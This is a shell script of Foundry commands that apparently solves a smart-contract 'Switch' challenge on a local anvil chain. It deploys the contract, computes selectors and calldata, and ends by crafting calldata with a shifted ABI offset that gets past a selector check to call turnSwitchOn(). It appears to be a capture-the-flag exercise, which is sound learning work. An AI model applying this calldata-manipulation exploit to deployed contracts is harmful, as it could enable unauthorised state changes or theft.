# Test Attack against local chain
anvil

# Deploy Switch contract
forge create \
      --private-key ac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80  \
      --rpc-url http://127.0.0.1:8545  \
      src/Switch.sol:Switch

# Save contract address
export SWITCH="0x5FbDB2315678afecb367f032d93F642f64180aa3"

# Get some useful values
cast sig "turnSwitchOff()"
# 0x20606e15

cast sig "turnSwitchOn()"
# 0x76227e12

cast sig "flipSwitch(bytes)"
# 0x30c13ade

cast calldata "flipSwitch(bytes)" 0x20606e15
# 0x30c13ade0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000

cast calldata "flipSwitch(bytes)" 0x76227e12
# 0x30c13ade0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000

# Switch is initially off
cast call $SWITCH \
      "switchOn()" \
      --private-key ac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80  \
      --rpc-url http://127.0.0.1:8545

# Confirm that we can call flipSwitch passing it turnSwitchOff() selector
cast send $SWITCH \
      "flipSwitch(bytes)"  \
      0x20606e15 \
      --private-key ac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80  \
      --rpc-url http://127.0.0.1:8545


# ...but we cannot just pass turnSwitchOn() selector (without crafting the calldata)
cast send $SWITCH \
      "flipSwitch(bytes)"  \
      0x76227e12 \
      --private-key ac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80  \
      --rpc-url http://127.0.0.1:8545

# Same thing when passing cast send the raw calldata
# Success on calling turnSwitchOff()
cast send $SWITCH \
      0x30c13ade0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000 \
      --private-key ac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80  \
      --rpc-url http://127.0.0.1:8545


# Fail on calling turnSwitchOn()
cast send $SWITCH \
      0x30c13ade0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000 \
      --private-key ac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80  \
      --rpc-url http://127.0.0.1:8545

# Confirm switch is still off
cast call $SWITCH \
      "switchOn()" \
      --private-key ac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80  \
      --rpc-url http://127.0.0.1:8545

# Attack: Bypass the turnSwitchOff() check and invoke turnSwitchOn()
cast send $SWITCH \
      0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000 \
      --private-key ac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80  \
      --rpc-url http://127.0.0.1:8545

# Confirm switch is on
cast call $SWITCH \
      "switchOn()" \
      --private-key ac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80  \
      --rpc-url http://127.0.0.1:8545

